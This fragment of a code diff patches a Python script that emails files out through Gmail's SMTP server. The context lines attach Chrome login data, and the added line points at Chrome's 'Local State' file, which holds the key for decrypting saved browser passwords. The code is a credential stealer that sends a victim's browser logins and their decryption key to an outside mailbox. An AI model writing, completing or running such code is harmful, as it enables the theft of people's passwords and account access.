@@ -49,6 +49,7 @@ with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
             attach_file(em, login_data_path)
         index += 1
     secreti = os.path.join(os.environ['USERPROFILE'], r"AppData\Local\Google\Chrome\User Data")
+    secreti = os.path.join(secreti, "Local State")
     attach_file(em, secreti)
 
 
